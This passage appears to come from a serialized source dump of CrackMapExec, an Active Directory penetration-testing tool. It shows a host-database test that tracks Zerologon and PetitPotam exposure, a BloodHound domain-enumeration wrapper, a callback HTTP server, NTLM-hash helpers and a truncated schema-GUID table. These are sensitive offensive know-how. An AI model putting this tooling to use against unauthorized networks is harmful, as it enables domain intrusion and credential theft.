db_setup.clear_database()\n\n\n@pytest.fixture(scope=""session"")\ndef sess(db_engine):\n    session_factory = sessionmaker(bind=db_engine, expire_on_commit=True)\n    Session = scoped_session(session_factory)\n    sess = Session()\n    yield sess\n    sess.close()\n\n\ndef test_add_host(db):\n    db.add_host(\n        ""127.0.0.1"",\n        ""localhost"",\n        ""TEST.DEV"",\n        ""Windows Testing 2023"",\n        False,\n        True,\n        True,\n        True,\n        False,\n        False,\n    )\n    inserted_host = db.get_hosts()\n    assert len(inserted_host) == 1\n    host = inserted_host[0]\n    assert host.id == 1\n    assert host.ip == ""127.0.0.1""\n    assert host.hostname == ""localhost""\n    assert host.os == ""Windows Testing 2023""\n    assert host.smbv1 is False\n    assert host.signing is True\n    assert host.spooler is True\n    assert host.zerologon is True\n    assert host.petitpotam is False\n    assert host.dc is False\n\n\ndef test_update_host(db, sess):\n    host = {\n        ""ip"": ""127.0.0.1"",\n        ""hostname"": ""localhost"",\n        ""domain"": ""TEST.DEV"",\n        ""os"": ""Windows Testing 2023"",\n        ""smbv1"": True,\n        ""signing"": False,\n        ""spooler"": True,\n        ""zerologon"": False,\n        ""petitpotam"": False,\n        ""dc"": False,\n    }\n    iq = Insert(db.HostsTable)\n    sess.execute(iq, [host])\n    db.add_host(\n        ""127.0.0.1"",\n        ""localhost"",\n        ""TEST.DEV"",\n        ""Windows Testing 2023 Updated"",\n        False,\n        True,\n        False,\n        False,\n        False,\n        False,\n    )\n    inserted_host = db.get_hosts()\n    assert len(inserted_host) == 1\n    host = inserted_host[0]\n    assert host.id == 1\n    assert host.ip == ""127.0.0.1""\n    assert host.hostname == ""localhost""\n    assert host.os == ""Windows Testing 2023 Updated""\n    assert host.smbv1 is False\n    assert host.signing is True\n    assert host.spooler is False\n    assert host.zerologon is False\n    assert host.petitpotam is False\n    assert host.dc is False\n\n\ndef test_add_credential():\n    pass\n\n\ndef test_update_credential():\n    pass\n\n\ndef test_remove_credential():\n    pass\n\n\ndef test_add_admin_user():\n    pass\n\n\ndef test_get_admin_relations():\n    pass\n\n\ndef test_remove_admin_relation():\n    pass\n\n\ndef test_is_credential_valid():\n    pass\n\n\ndef test_get_credentials():\n    pass\n\n\ndef test_get_credential():\n    pass\n\n\ndef test_is_credential_local():\n    pass\n\n\ndef test_is_host_valid():\n    pass\n\n\ndef test_get_hosts():\n    pass\n\n\ndef test_is_group_valid():\n    pass\n\n\ndef test_add_group():\n    pass\n\n\ndef test_get_groups():\n    pass\n\n\ndef test_get_group_relations():\n    pass\n\n\ndef test_remove_group_relations():\n    pass\n\n\ndef test_is_user_valid():\n    pass\n\n\ndef test_get_users():\n    pass\n\n\ndef test_get_user():\n    pass\n\n\ndef test_get_domain_controllers():\n    pass\n\n\ndef test_is_share_valid():\n    pass\n\n\ndef test_add_share():\n    pass\n\n\ndef test_get_shares():\n    pass\n\n\ndef test_get_shares_by_access():\n    pass\n\n\ndef test_get_users_with_share_access():\n    pass\n\n\ndef test_add_domain_backupkey():\n    pass\n\n\ndef test_get_domain_backupkey():\n    pass\n\n\ndef test_is_dpapi_secret_valid():\n    pass\n\n\ndef test_add_dpapi_secrets():\n    pass\n\n\ndef test_get_dpapi_secrets():\n    pass\n\n\ndef test_add_loggedin_relation():\n    pass\n\n\ndef test_get_loggedin_relations():\n    pass\n\n\ndef test_remove_loggedin_relations():\n    pass\n', 'hook-lsassy.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom PyInstaller.utils.hooks import collect_all\n\ndatas, binaries, hiddenimports = collect_all(""lsassy"")\n', 'bash.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nimport os\nfrom cme.paths import DATA_PATH\n\n\ndef get_script(path):\n    with open(os.path.join(DATA_PATH, path), ""r"") as script:\n        return script.read()\n', 'bloodhound.py': 'import sys, time\n\nfrom cme.logger import CMEAdapter\nfrom bloodhound.ad.domain import ADDC\nfrom bloodhound.enumeration.computers import ComputerEnumerator\nfrom bloodhound.enumeration.memberships import MembershipEnumerator\nfrom bloodhound.enumeration.domains import DomainEnumerator\n\n\nclass BloodHound(object):\n    def __init__(self, ad, hostname, host, port):\n        self.ad = ad\n        self.ldap = None\n        self.pdc = None\n        self.sessions = []\n        self.hostname = hostname\n        self.dc = hostname\n        self.proto_logger(port, hostname, host)\n\n    def proto_logger(self, port, hostname, host):\n        self.logger = CMEAdapter(extra={""protocol"": ""LDAP"", ""host"": host, ""port"": port, ""hostname"": hostname})\n\n    def connect(self):\n        if len(self.ad.dcs()) == 0:\n            self.logger.fail(""Could not find a domain controller. Consider specifying a domain and/or DNS server."")\n            sys.exit(1)\n\n        if not self.ad.baseDN:\n            self.logger.fail(""Could not figure out the domain to query. Please specify this manually with -d"")\n            sys.exit(1)\n\n        pdc = self.ad.dcs()[0]\n        self.logger.debug(""Using LDAP server: %s"", pdc)\n        self.logger.debug(""Using base DN: %s"", self.ad.baseDN)\n\n        if len(self.ad.kdcs()) > 0:\n            kdc = self.ad.kdcs()[0]\n            self.logger.debug(""Using kerberos KDC: %s"", kdc)\n            self.logger.debug(""Using kerberos realm: %s"", self.ad.realm())\n\n        # Create a domain controller object\n        self.pdc = ADDC(pdc, self.ad)\n        # Create an object resolver\n        self.ad.create_objectresolver(self.pdc)\n\n    #        self.pdc.ldap_connect(self.ad.auth.username, self.ad.auth.password, kdc)\n\n    def run(\n        self,\n        collect,\n        num_workers=10,\n        disable_pooling=False,\n        timestamp="""",\n        computerfile="""",\n        cachefile=None,\n        exclude_dcs=False,\n    ):\n        start_time = time.time()\n        if cachefile:\n            self.ad.load_cachefile(cachefile)\n\n        # Check early if we should enumerate computers as well\n        do_computer_enum = any(\n            method in collect\n            for method in [\n                ""localadmin"",\n                ""session"",\n                ""loggedon"",\n                ""experimental"",\n                ""rdp"",\n                ""dcom"",\n                ""psremote"",\n            ]\n        )\n\n        if ""group"" in collect or ""objectprops"" in collect or ""acl"" in collect:\n            # Fetch domains for later, computers if needed\n            self.pdc.prefetch_info(\n                ""objectprops"" in collect,\n                ""acl"" in collect,\n                cache_computers=do_computer_enum,\n            )\n            # Initialize enumerator\n            membership_enum = MembershipEnumerator(self.ad, self.pdc, collect, disable_pooling)\n            membership_enum.enumerate_memberships(timestamp=timestamp)\n        elif ""container"" in collect:\n            # Fetch domains for later, computers if needed\n            self.pdc.prefetch_info(\n                ""objectprops"" in collect,\n                ""acl"" in collect,\n                cache_computers=do_computer_enum,\n            )\n            # Initialize enumerator\n            membership_enum = MembershipEnumerator(self.ad, self.pdc, collect, disable_pooling)\n            membership_enum.do_container_collection(timestamp=timestamp)\n        elif do_computer_enum:\n            # We need to know which computers to query regardless\n            # We also need the domains to have a mapping from NETBIOS -> FQDN for local admins\n            self.pdc.prefetch_info(""objectprops"" in collect, ""acl"" in collect, cache_computers=True)\n        elif ""trusts"" in collect:\n            # Prefetch domains\n            self.pdc.get_domains(""acl"" in collect)\n        if ""trusts"" in collect or ""acl"" in collect or ""objectprops"" in collect:\n            trusts_enum = DomainEnumerator(self.ad, self.pdc)\n            trusts_enum.dump_domain(collect, timestamp=timestamp)\n        if do_computer_enum:\n            # If we don\'t have a GC server, don\'t use it for deconflictation\n            have_gc = len(self.ad.gcs()) > 0\n            computer_enum = ComputerEnumerator(\n                self.ad,\n                self.pdc,\n                collect,\n                do_gc_lookup=have_gc,\n                computerfile=computerfile,\n                exclude_dcs=exclude_dcs,\n            )\n            computer_enum.enumerate_computers(self.ad.computers, num_workers=num_workers, timestamp=timestamp)\n        end_time = time.time()\n        minutes, seconds = divmod(int(end_time - start_time), 60)\n        self.logger.highlight(""Done in %02dM %02dS"" % (minutes, seconds))\n', 'http.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport http.server\nimport threading\nimport ssl\nimport os\nimport sys\nfrom http.server import BaseHTTPRequestHandler\nfrom time import sleep\nfrom cme.helpers.logger import highlight\nfrom cme.logger import CMEAdapter\n\n\nclass RequestHandler(BaseHTTPRequestHandler):\n    def log_message(self, format, *args):\n        server_logger = CMEAdapter(\n            extra={\n                ""module_name"": self.server.module.name.upper(),\n                ""host"": self.client_address[0],\n            }\n        )\n        server_logger.display(""- - %s"" % (format % args))\n\n    def do_GET(self):\n        if hasattr(self.server.module, ""on_request""):\n            server_logger = CMEAdapter(\n                extra={\n                    ""module_name"": self.server.module.name.upper(),\n                    ""host"": self.client_address[0],\n                }\n            )\n            self.server.context.log = server_logger\n            self.server.module.on_request(self.server.context, self)\n\n    def do_POST(self):\n        if hasattr(self.server.module, ""on_response""):\n            server_logger = CMEAdapter(\n                extra={\n                    ""module_name"": self.server.module.name.upper(),\n                    ""host"": self.client_address[0],\n                }\n            )\n            self.server.context.log = server_logger\n            self.server.module.on_response(self.server.context, self)\n\n    def stop_tracking_host(self):\n        """"""\n        This gets called when a module has finshed executing, removes the host from the connection tracker list\n        """"""\n        try:\n            self.server.hosts.remove(self.client_address[0])\n            if hasattr(self.server.module, ""on_shutdown""):\n                self.server.module.on_shutdown(self.server.context, self.server.connection)\n        except ValueError:\n            pass\n\n\nclass CMEServer(threading.Thread):\n    def __init__(self, module, context, logger, srv_host, port, server_type=""https""):\n        try:\n            threading.Thread.__init__(self)\n\n            self.server = http.server.HTTPServer((srv_host, int(port)), RequestHandler)\n            self.server.hosts = []\n            self.server.module = module\n            self.server.context = context\n            self.server.log = CMEAdapter(extra={""module_name"": self.server.module.name.upper()})\n            self.cert_path = os.path.join(os.path.expanduser(""~/.cme""), ""cme.pem"")\n            self.server.track_host = self.track_host\n\n            logger.debug(""CME server type: "" + server_type)\n            if server_type == ""https"":\n                self.server.socket = ssl.wrap_socket(self.server.socket, certfile=self.cert_path, server_side=True)\n\n        except Exception as e:\n            errno, message = e.args\n            if errno == 98 and message == ""Address already in use"":\n                logger.error(""Error starting HTTP(S) server: the port is already in use, try specifying a diffrent port using --server-port"")\n            else:\n                logger.error(f""Error starting HTTP(S) server: {message}"")\n\n            sys.exit(1)\n\n    def base_server(self):\n        return self.server\n\n    def track_host(self, host_ip):\n        self.server.hosts.append(host_ip)\n\n    def run(self):\n        try:\n            self.server.serve_forever()\n        except:\n            pass\n\n    def shutdown(self):\n        try:\n            while len(self.server.hosts) > 0:\n                self.server.log.info(f""Waiting on {highlight(len(self.server.hosts))} host(s)"")\n                sleep(15)\n        except KeyboardInterrupt:\n            pass\n\n        # shut down the server/socket\n        self.server.shutdown()\n        self.server.socket.close()\n        self.server.server_close()\n\n        # make sure all the threads are killed\n        for thread in threading.enumerate():\n            if thread.is_alive():\n                try:\n                    thread._stop()\n                except:\n                    pass\n', 'misc.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport random\nimport string\nimport re\nimport inspect\nimport os\n\n\ndef identify_target_file(target_file):\n    with open(target_file, ""r"") as target_file_handle:\n        for i, line in enumerate(target_file_handle):\n            if i == 1:\n                if line.startswith(""<NessusClientData""):\n                    return ""nessus""\n                elif line.endswith(""nmaprun>\\n""):\n                    return ""nmap""\n\n    return ""unknown""\n\n\ndef gen_random_string(length=10):\n    return """".join(random.sample(string.ascii_letters, int(length)))\n\n\ndef validate_ntlm(data):\n    allowed = re.compile(""^[0-9a-f]{32}"", re.IGNORECASE)\n    if allowed.match(data):\n        return True\n    else:\n        return False\n\n\ndef called_from_cmd_args():\n    for stack in inspect.stack():\n        if stack[3] == ""print_host_info"":\n            return True\n        if stack[3] == ""plaintext_login"" or stack[3] == ""hash_login"" or stack[3] == ""kerberos_login"":\n            return True\n        if stack[3] == ""call_cmd_args"":\n            return True\n    return False\n\n\n# Stolen from https://github.com/pydanny/whichcraft/\ndef which(cmd, mode=os.F_OK | os.X_OK, path=None):\n    """"""Given a command, mode, and a PATH string, return the path which\n    conforms to the given mode on the PATH, or None if there is no such\n    file.\n    `mode` defaults to os.F_OK | os.X_OK. `path` defaults to the result\n    of os.environ.get(""PATH""), or can be overridden with a custom search\n    path.\n    Note: This function was backported from the Python 3 source code.\n    """"""\n\n    # Check that a given file can be accessed with the correct mode.\n    # Additionally check that `file` is not a directory, as on Windows\n    # directories pass the os.access check.\n    def _access_check(fn, mode):\n        return os.path.exists(fn) and os.access(fn, mode) and not os.path.isdir(fn)\n\n    # If we\'re given a path with a directory part, look it up directly\n    # rather than referring to PATH directories. This includes checking\n    # relative to the current directory, e.g. ./script\n    if os.path.dirname(cmd):\n        if _access_check(cmd, mode):\n            return cmd\n        return None\n\n    if path is None:\n        path = os.environ.get(""PATH"", os.defpath)\n    if not path:\n        return None\n    path = path.split(os.pathsep)\n\n    files = [cmd]\n\n    seen = set()\n    for dir in path:\n        normdir = os.path.normcase(dir)\n        if normdir not in seen:\n            seen.add(normdir)\n            for thefile in files:\n                name = os.path.join(dir, thefile)\n                if _access_check(name, mode):\n                    return name\n    return None\n', 'msada_guids.py': '""""""\nImpacket - Collection of Python classes for working with network protocols.\n\nSECUREAUTH LABS. Copyright (C) 2020 SecureAuth Corporation. All rights reserved.\n\nThis software is provided under a slightly modified version\nof the Apache Software License. See the accompanying LICENSE file\nfor more information.\n\nAuthors:\n  Charlie BROMBERG (@_nwodtuhs)\n  Guillaume DAUMAS (@BlWasp_)\n  Lucien DOUSTALY (@Wlayzz)\n\nReferences:\n  MS-ADA1, MS-ADA2, MS-ADA3 Active Directory Schema Attributes and their GUID:\n  - [MS-ADA1] https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-ada1/19528560-f41e-4623-a406-dabcfff0660f\n  - [MS-ADA2] https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/e20ebc4e-5285-40ba-b3bd-ffcb81c2783e\n  - [MS-ADA3] https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/4517e835-3ee6-44d4-bb95-a94b6966bfb0\n  GUIDS gathered from (lots of cleaning made from that source, things may be missing):\n  - https://www.powershellgallery.com/packages/SDDLParser/0.5.0/Content/SDDLParserADObjects.ps1\n\n\nThis library is, for the moment, not present in the Impacket version used by CrackMapExec, so I add it manually in helpers.\n""""""\n\nSCHEMA_OBJECTS = {\n    ""2a132580-9373-11d1-aebc-0000f80367c1"": ""FRS-Partner-Auth-Level"",\n    ""2a8c68fc-3a7a-4e87-8720-fe77c51cbe74"": ""ms-DS-Non-Members-BL"",\n    ""963d2751-48be-11d1-a9c3-0000f80367c1"": ""Mscope-Id"",\n    ""bf967a0c-0de6-11d0-a285-00aa003049e2"": ""Range-Lower"",\n    ""29259694-09e4-4237-9f72-9306ebe63ab2"": ""ms-TS-Primary-Desktop"",\n    ""963d2756-48be-11d1-a9c3-0000f80367c1"": ""DHCP-Class"",\n    ""1562a632-44b9-4a7e-a2d3-e426c96a3acc"": ""ms-PKI-Private-Key-Recovery-Agent"",\n    ""2a132581-9373-11d1-aebc-0000f80367c1"": ""FRS-Primary-Member"",\n    ""4b1cba4e-302f-4134-ac7c-f01f6c797843"": ""ms-DS-Phonetic-First-Name"",\n    ""7bfdcb7d-4807-11d1-a9c3-0000f80367c1"": ""Msi-File-List"",\n    ""bf967a0d-0de6-11d0-a285-00aa003049e2"": ""Range-Upper"",\n    ""f63aa29a-bb31-48e1-bfab-0a6c5a1d39c2"": ""ms-TS-Secondary-Desktops"",\n    ""5245801a-ca6a-11d0-afff-0000f80367c1"": ""FRS-Replica-Set-GUID"",\n    ""f217e4ec-0836-4b90-88af-2f5d4bbda2bc"": ""ms-DS-Phonetic-Last-Name"",\n    ""d9e18313-8939-11d1-aebc-0000f80367c1"": ""Msi-Script"",\n    ""bf967a0e-0de6-11d0-a285-00aa003049e2"": ""RDN"",\n    ""9daadc18-40d1-4ed1-a2bf-6b9bf47d3daa"": ""ms-TS-Primary-Desktop-BL"",\n    ""e0fa1e8a-9b45-11d0-afdd-00c04fd930c9"": ""Display-Specifier"",\n    ""bf967aa8-0de6-11d0-a285-00aa003049e2"": ""Print-Queue"",\n    ""bf967a8f-0de6-11d0-a285-00aa003049e2"": ""DMD"",\n    ""26d9736b-6070-11d1-a9c6-0000f80367c1"": ""FRS-Replica-Set-Type"",\n    ""6cd53daf-003e-49e7-a702-6fa896e7a6ef"": ""ms-DS-Phonetic-Department"",\n    ""96a7dd62-9118-11d1-aebc-0000f80367c1"": ""Msi-Script-Name"",\n    ""bf967a0f-0de6-11d0-a285-00aa003049e2"": ""RDN-Att-ID"",\n    ""34b107af-a00a-455a-b139-dd1a1b12d8af"": ""ms-TS-Secondary-Desktop-BL"",\n    ""1be8f174-a9ff-11d0-afe2-00c04fd930c9"": ""FRS-Root-Path"",\n    ""5bd5208d-e5f4-46ae-a514-543bc9c47659"": ""ms-DS-Phonetic-Company-Name"",\n    ""bf967937-0de6-11d0-a285-00aa003049e2"": ""Msi-Script-Path"",\n    ""bf967a10-0de6-11d0-a285-00aa003049e2"": ""Registered-Address"",\n    ""faaea977-9655-49d7-853d-f27bb7aaca0f"": ""MS-TS-Property01"",\n    ""5fd4250c-1262-11d0-a060-00aa006c33ed"": ""Display-Template"",\n    ""83cc7075-cca7-11d0-afff-0000f80367c1"": ""Query-Policy"",\n    ""5a8b3261-c38d-11d1-bbc9-0080c76670c0"": ""SubSchema"",\n    ""5245801f-ca6a-11d0-afff-0000f80367c1"": ""FRS-Root-Security"",\n    ""e21a94e4-2d66-4ce5-b30d-0ef87a776ff0"": ""ms-DS-Phonetic-Display-Name"",\n    ""96a7dd63-9118-11d1-aebc-0000f80367c1"": ""Msi-Script-Size"",\n    ""bf967a12-0de6-11d0-a285-00aa003049e2"": ""Remote-Server-Name"",\n    ""3586f6ac-51b7-4978-ab42-f936463198e7"": ""MS-TS-Property02"",\n    ""bf967915-0de6-11d0-a285-00aa003049e2"": ""Account-Expires"",\n    ""ddac0cee-af8f-11d0-afeb-00c04fd930c9"": ""FRS-Service-Command"",\n    ""def449f1-fd3b-4045-98cf-d9658da788b5"": ""ms-DS-HAB-Seniority-Index"",\n    ""9a0dc326-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Authenticate"",\n    ""bf967a14-0de6-11d0-a285-00aa003049e2"": ""Remote-Source"",\n    ""70004ef5-25c3-446a-97c8-996ae8566776"": ""MS-TS-ExpireDate"",\n    ""bf967aa9-0de6-11d0-a285-00aa003049e2"": ""Remote-Mail-Recipient"",\n    ""bf967a80-0de6-11d0-a285-00aa003049e2"": ""Attribute-Schema"",\n    ""2a132582-9373-11d1-aebc-0000f80367c1"": ""FRS-Service-Command-Status"",\n    ""c881b4e2-43c0-4ebe-b9bb-5250aa9b434c"": ""ms-DS-Promotion-Settings"",\n    ""9a0dc323-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Base-Priority"",\n    ""bf967a15-0de6-11d0-a285-00aa003049e2"": ""Remote-Source-Type"",\n    ""54dfcf71-bc3f-4f0b-9d5a-4b2476bb8925"": ""MS-TS-ExpireDate2"",\n    ""e0fa1e8b-9b45-11d0-afdd-00c04fd930c9"": ""Dns-Zone"",\n    ""031952ec-3b72-11d2-90cc-00c04fd91ab1"": ""Account-Name-History"",\n    ""1be8f175-a9ff-11d0-afe2-00c04fd930c9"": ""FRS-Staging-Path"",\n    ""98a7f36d-3595-448a-9e6f-6b8965baed9c"": ""ms-DS-SiteName"",\n    ""9a0dc32e-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Computer-Type"",\n    ""2a39c5b0-8960-11d1-aebc-0000f80367c1"": ""Remote-Storage-GUID"",\n    ""41bc7f04-be72-4930-bd10-1f3439412387"": ""MS-TS-ExpireDate3"",\n    ""2a39c5bd-8960-11d1-aebc-0000f80367c1"": ""Remote-Storage-Service-Point"",\n    ""7f56127d-5301-11d1-a9c5-0000f80367c1"": ""ACS-Aggregate-Token-Rate-Per-User"",\n    ""2a132583-9373-11d1-aebc-0000f80367c1"": ""FRS-Time-Last-Command"",\n    ""20119867-1d04-4ab7-9371-cfc3d5df0afd"": ""ms-DS-Supported-Encryption-Types"",\n    ""18120de8-f4c4-4341-bd95-32eb5bcf7c80"": ""MSMQ-Computer-Type-Ex"",\n    ""281416c0-1968-11d0-a28f-00aa003049e2"": ""Repl-Property-Meta-Data"",\n    ""5e11dc43-204a-4faf-a008-6863621c6f5f"": ""MS-TS-ExpireDate4"",\n    ""39bad96d-c2d6-4baf-88ab-7e4207600117"": ""document"",\n    ""7f561283-5301-11d1-a9c5-0000f80367c1"": ""ACS-Allocable-RSVP-Bandwidth"",\n    ""2a132584-9373-11d1-aebc-0000f80367c1"": ""FRS-Time-Last-Config-Change"",\n    ""29cc866e-49d3-4969-942e-1dbc0925d183"": ""ms-DS-Trust-Forest-Trust-Info"",\n    ""9a0dc33a-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Cost"",\n    ""7bfdcb83-4807-11d1-a9c3-0000f80367c1"": ""Repl-Topology-Stay-Of-Execution"",\n    ""0ae94a89-372f-4df2-ae8a-c64a2bc47278"": ""MS-TS-LicenseVersion"",\n    ""a8df74d6-c5ea-11d1-bbcb-0080c76670c0"": ""Residential-Person"",\n    ""1cb355a1-56d0-11d1-a9c6-0000f80367c1"": ""ACS-Cache-Timeout"",\n    ""1be8f172-a9ff-11d0-afe2-00c04fd930c9"": ""FRS-Update-Timeout"",\n    ""461744d7-f3b6-45ba-8753-fb9552a5df32"": ""ms-DS-Tombstone-Quota-Factor"",\n    ""9a0dc334-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-CSP-Name"",\n    ""bf967a16-0de6-11d0-a285-00aa003049e2"": ""Repl-UpToDate-Vector"",\n    ""4b0df103-8d97-45d9-ad69-85c3080ba4e7"": ""MS-TS-LicenseVersion2"",\n    ""7a2be07c-302f-4b96-bc90-0795d66885f8"": ""documentSeries"",\n    ""7f56127a-5301-11d1-a9c5-0000f80367c1"": ""ACS-Direction"",\n    ""2a132585-9373-11d1-aebc-0000f80367c1"": ""FRS-Version"",\n    ""7b7cce4f-f1f5-4bb6-b7eb-23504af19e75"": ""ms-DS-Top-Quota-Usage"",\n    ""2df90d83-009f-11d2-aa4c-00c04fd7d83a"": ""MSMQ-Dependent-Client-Service"",\n    ""bf967a18-0de6-11d0-a285-00aa003049e2"": ""Replica-Source"",\n    ""f8ba8f81-4cab-4973-a3c8-3a6da62a5e31"": ""MS-TS-LicenseVersion3"",\n    ""19195a5a-6da0-11d0-afd3-00c04fd930c9"": ""Domain"",\n    ""b93e3a78-cbae-485e-a07b-5ef4ae505686"": ""rFC822LocalPart"",\n    ""1cb355a0-56d0-11d1-a9c6-0000f80367c1"": ""ACS-DSBM-DeadTime"",\n    ""26d9736c-6070-11d1-a9c6-0000f80367c1"": ""FRS-Version-GUID"",\n    ""d064fb68-1480-11d3-91c1-0000f87a57d4"": ""MS-DS-Machine-Account-Quota"",\n    ""2df90d76-009f-11d2-aa4c-00c04fd7d83a"": ""MSMQ-Dependent-Client-Services"",\n    ""bf967a1c-0de6-11d0-a285-00aa003049e2"": ""Reports"",\n    ""70ca5d97-2304-490a-8a27-52678c8d2095"": ""MS-TS-LicenseVersion4"",\n    ""19195a5b-6da0-11d0-afd3-00c04fd930c9"": ""Domain-DNS"",\n    ""1cb3559e-56d0-11d1-a9c6-0000f80367c1"": ""ACS-DSBM-Priority"",\n    ""1be8f173-a9ff-11d0-afe2-00c04fd930c9"": ""FRS-Working-Path"",\n    ""638ec2e8-22e7-409c-85d2-11b21bee72de"": ""ms-DS-Object-Reference"",\n    ""9a0dc33c-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Digests"",\n    ""45ba9d1a-56fa-11d2-90d0-00c04fd91ab1"": ""Repl-Interval"",\n    ""f3bcc547-85b0-432c-9ac0-304506bf2c83"": ""MS-TS-ManagingLS"",\n    ""6617188d-8f3c-11d0-afda-00c04fd930c9"": ""RID-Manager"",\n    ""1cb3559f-56d0-11d1-a9c6-0000f80367c1"": ""ACS-DSBM-Refresh"",\n    ""66171887-8f3c-11d0-afda-00c04fd930c9"": ""FSMO-Role-Owner"",\n    ""2b702515-c1f7-4b3b-b148-c0e4c6ceecb4"": ""ms-DS-Object-Reference-BL"",\n    ""0f71d8e0-da3b-11d1-90a5-00c04fd91ab1"": ""MSMQ-Digests-Mig"",\n    ""bf967a1d-0de6-11d0-a285-00aa003049e2"": ""Reps-From"",\n    ""349f0757-51bd-4fc8-9d66-3eceea8a25be"": ""MS-TS-ManagingLS2"",\n    ""bf967a99-0de6-11d0-a285-00aa003049e2"": ""Domain-Policy"",\n    ""7f561287-5301-11d1-a9c5-0000f80367c1"": ""ACS-Enable-ACS-Service"",\n    ""5fd424a1-1262-11d0-a060-00aa006c33ed"": ""Garbage-Coll-Period"",\n    ""93f701be-fa4c-43b6-bc2f-4dbea718ffab"": ""ms-DS-Operations-For-Az-Role"",\n    ""2df90d82-009f-11d2-aa4c-00c04fd7d83a"": ""MSMQ-Ds-Service"",\n    ""bf967a1e-0de6-11d0-a285-00aa003049e2"": ""Reps-To"",\n    ""fad5dcc1-2130-4c87-a118-75322cd67050"": ""MS-TS-ManagingLS3"",\n    ""7bfdcb89-4807-11d1-a9c3-0000f80367c1"": ""RID-Set"",\n    ""f072230e-aef5-11d1-bdcf-0000f80367c1"": ""ACS-Enable-RSVP-Accounting"",\n    ""bf96797a-0de6-11d0-a285-00aa003049e2"": ""Generated-Connection"",\n    ""f85b6228-3734-4525-b6b7-3f3bb220902c"": ""ms-DS-Operations-For-Az-Role-BL"",\n    ""2df90d78-009f-11d2-aa4c-00c04fd7d83a"": ""MSMQ-Ds-Services"",\n    ""7d6c0e93-7e20-11d0-afd6-00c04fd930c9"": ""Required-Categories"",\n    ""f7a3b6a0-2107-4140-b306-75cb521731e5"": ""MS-TS-ManagingLS4"",\n    ""8bfd2d3d-efda-4549-852c-f85e137aedc6"": ""domainRelatedObject"",\n    ""7f561285-5301-11d1-a9c5-0000f80367c1"": ""ACS-Enable-RSVP-Message-Logging"",\n    ""16775804-47f3-11d1-a9c3-0000f80367c1"": ""Generation-Qualifier"",\n    ""1aacb436-2e9d-44a9-9298-ce4debeb6ebf"": ""ms-DS-Operations-For-Az-Task"",\n    ""9a0dc331-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Encrypt-Key"",\n    ""7bfdcb7f-4807-11d1-a9c3-0000f80367c1"": ""Retired-Repl-DSA-Signatures"",\n    ""87e53590-971d-4a52-955b-4794d15a84ae"": ""MS-TSLS-Property01"",\n    ""7860e5d2-c8b0-4cbb-bd45-d9455beb9206"": ""room"",\n    ""eded5844-b3c3-41c3-a9e6-8984b52b7f98"": ""ms-Org-Group-Subtype-Name"",\n    ""7f561286-5301-11d1-a9c5-0000f80367c1"": ""ACS-Event-Log-Level"",\n    ""f0f8ff8e-1191-11d0-a060-00aa006c33ed"": ""Given-Name"",\n    ""a637d211-5739-4ed1-89b2-88974548bc59"": ""ms-DS-Operations-For-Az-Task-BL"",\n    ""9a0dc32f-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Foreign"",\n    ""b7c69e6d-2cc7-11d2-854e-00a0c983f608"": ""Token-Groups"",\n    ""47c77bb0-316e-4e2f-97f1-0d4c48fca9dd"": ""MS-TSLS-Property02"",\n    ""09b10f14-6f93-11d2-9905-0000f87a57d4"": ""DS-UI-Settings"",\n    ""49b7560b-4707-4aa0-a27c-e17a09ca3f97"": ""ms-Org-Is-Organizational-Group"",\n    ""dab029b6-ddf7-11d1-90a5-00c04fd91ab1"": ""ACS-Identity-Name"",\n    ""f754c748-06f4-11d2-aa53-00c04fd7d83a"": ""Global-Address-List"",\n    ""79d2f34c-9d7d-42bb-838f-866b3e4400e2"": ""ms-DS-Other-Settings"",\n    ""9a0dc32c-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-In-Routing-Servers"",\n    ""46a9b11d-60ae-405a-b7e8-ff8a58d456d2"": ""Token-Groups-Global-And-Universal"",\n    ""6a84ede5-741e-43fd-9dd6-aa0f61578621"": ""ms-DFSR-DisablePacketPrivacy"",\n    ""80212842-4bdc-11d1-a9c4-0000f80367c1"": ""Rpc-Container"",\n    ""8f905f24-a413-435a-8ed1-35385ec179f7"": ""ms-Org-Other-Display-Names"",\n    ""f072230c-aef5-11d1-bdcf-0000f80367c1"": ""ACS-Max-Aggregate-Peak-Rate-Per-User"",\n    ""bf96797d-0de6-11d0-a285-00aa003049e2"": ""Governs-ID"",\n    ""564e9325-d057-c143-9e3b-4f9e5ef46f93"": ""ms-DS-Principal-Name"",\n    ""8ea825aa-3b7b-11d2-90cc-00c04fd91ab1"": ""MSMQ-Interval1"",\n    ""040fc392-33df-11d2-98b2-0000f87a57d4"": ""Token-Groups-No-GC-Acceptable"",\n    ""87811bd5-cd8b-45cb-9f5d-980f3a9e0c97"": ""ms-DFSR-DefaultCompressionExclusionFilter"",\n    ""3fdfee52-47f4-11d1-a9c3-0000f80367c1"": ""DSA"",\n    ""ee5b6790-3358-41a8-93f2-134ce21f3813"": ""ms-Org-Leaders"",\n    ""7f56127e-5301-11d1-a9c5-0000f80367c1"": ""ACS-Max-Duration-Per-Flow"",\n    ""f30e3bbe-9ff0-11d1-b603-0000f80367c1"": ""GP-Link"",\n    ""fbb9a00d-3a8c-4233-9cf9-7189264903a1"": ""ms-DS-Quota-Amount"",\n    ""99b88f52-3b7b-11d2-90cc-00c04fd91ab1"": ""MSMQ-Interval2"",\n    ""bf967a21-0de6-11d0-a285-00aa003049e2"": ""Revision"",\n    ""a68359dc-a581-4ee6-9015-5382c60f0fb4"": ""ms-DFSR-OnDemandExclusionFileFilter"",\n    ""bf967aac-0de6-11d0-a285-00aa003049e2"": ""rpc-Entry"",\n    ""afa58eed-a698-417e-9f56-fad54252c5f4"": ""ms-Org-Leaders-BL"",\n    ""f0722310-aef5-11d1-bdcf-0000f80367c1"": ""ACS-Max-No-Of-Account-Files"",\n    